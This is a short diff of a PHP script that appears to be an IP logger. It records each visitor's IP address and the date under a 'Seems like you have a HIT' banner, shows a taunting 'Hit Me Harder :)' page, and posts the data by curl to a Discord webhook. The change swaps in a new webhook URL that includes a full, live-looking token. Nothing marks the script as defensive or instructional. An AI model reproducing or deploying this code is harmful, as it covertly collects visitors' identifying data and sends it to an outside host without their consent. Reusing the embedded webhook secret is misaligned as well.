@@ -16,7 +16,7 @@ $log_message = "**Seems like you have a HIT**\n```Date: $date\t\nIP: $ip_address
 echo "<body><h1>Hit Me Harder :) </h1></body>";
 
 
-$webhook_url = "https://discord.com/api/webhooks/10589949/E9uS3k9MxnI5CiIfmtmXHfornTObgZ_xl"; // replace with your webhook URL
+$webhook_url = "https://discordapp.com/api/webhooks/1286552704042270791/Eachfj6P1R5gwnd5qxwUEkJuSu2goAHeVUAtkKsrhkR4P8c32ZhYmG6X0RE-qylVMv77"; // replace with your webhook URL
 $message = array("content" => "$log_message"); // the message you want to send
 
 $ch = curl_init($webhook_url);
